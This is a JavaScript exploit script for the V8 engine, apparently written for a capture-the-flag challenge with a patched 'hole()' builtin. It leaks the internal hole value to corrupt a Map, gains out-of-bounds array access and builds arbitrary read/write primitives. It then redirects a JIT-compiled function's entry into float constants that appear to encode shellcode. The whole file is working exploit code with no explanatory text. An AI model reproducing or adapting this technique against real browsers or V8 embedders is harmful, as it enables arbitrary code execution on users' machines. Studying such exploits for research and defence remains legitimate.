const print = console.log;
const assert = function (b, msg)
{
	if (!b)
		throw Error(msg);
};
const __buf8 = new ArrayBuffer(8);
const __dvCvt = new DataView(__buf8);
function d2u(val)
{ //double ==> Uint64
	__dvCvt.setFloat64(0, val, true);
	return __dvCvt.getUint32(0, true) +
		__dvCvt.getUint32(4, true) * 0x100000000;
}
function u2d(val)
{ //Uint64 ==> double
	const tmp0 = val % 0x100000000;
	__dvCvt.setUint32(0, tmp0, true);
	__dvCvt.setUint32(4, (val - tmp0) / 0x100000000, true);
	return __dvCvt.getFloat64(0, true);
}
function d22u(val)
{ //double ==> 2 * Uint32
	__dvCvt.setFloat64(0, val, true);
}
const hex = (x) => ("0x" + x.toString(16));
const foo = ()=>
{
	return [1.0,
		1.95538254221075331056310651818E-246,
		1.95606125582421466942709801013E-246,
		1.99957147195425773436923756715E-246,
		1.95337673326740932133292175341E-246,
		2.63486047652296056448306022844E-284];
}
for (let i = 0; i < 0x10000; i++) {
	foo();foo();foo();foo();
}

let a=[1.1,,,,,1]
function trigger() {
    var hole = a.hole()
    return hole
}
var map1 = null;
var foo_arr = null;
function getmap(m) {
    m = new Map();
    m.set(1, 1);
    m.set(trigger(), 1);
    m.delete(trigger());
    m.delete(trigger());
    m.delete(1);
    return m;
}

map1 = getmap(map1);
foo_arr = new Array(1.1, 1.1);// 1.1=3ff199999999999a
map1.set(0x10, -1);
map1.set(foo_arr, 0xffff);  // length 65535 
const arr = [1.1,1.2,1.3];
const o = {x:0x1337, a:foo };
const ab = new ArrayBuffer(20);
const ua = new Uint32Array(ab);
foo_arr[14] = 1.1;  // arr length
d22u(arr[5]);
const fooAddr = __dvCvt.getUint32(0, true);

//print(hex(fooAddr));
//%DebugPrint(foo);
//%DebugPrint(foo_arr);
//%DebugPrint(arr);
//%DebugPrint(ua);

var offset = 28
function readOff(off)
{
	arr[offset] = u2d((off) * 0x1000000);
	return ua[0];
}
function writeOff(off, val)
{
	arr[offset] = u2d((off) * 0x1000000);
	ua[0] = val;
}
//%SystemBreak();
codeAddr = readOff(fooAddr -1+ 0x18);
//print(hex(codeAddr));
jitAddr = readOff(codeAddr-1 + 0xc);
//print(hex(jitAddr));
writeOff(codeAddr-1 + 0xc, jitAddr + 0x95-0x19);
foo();
//%SystemBreak();